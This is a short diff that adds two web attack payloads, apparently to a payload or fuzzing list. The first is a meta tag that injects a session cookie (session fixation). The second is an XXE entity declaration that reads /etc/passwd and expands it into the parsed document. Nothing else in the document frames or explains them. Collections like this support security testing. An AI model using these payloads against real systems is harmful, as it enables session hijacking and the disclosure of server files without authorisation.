@@ -1,0 +1,2 @@
+<meta http-equiv=Set-Cookie content=”sessionid=abcd”>
+<!DOCTYPE asr [<!ENTITY xxx SYSTEM "/etc/passwd"]><nzr>&xxx;</nzr>
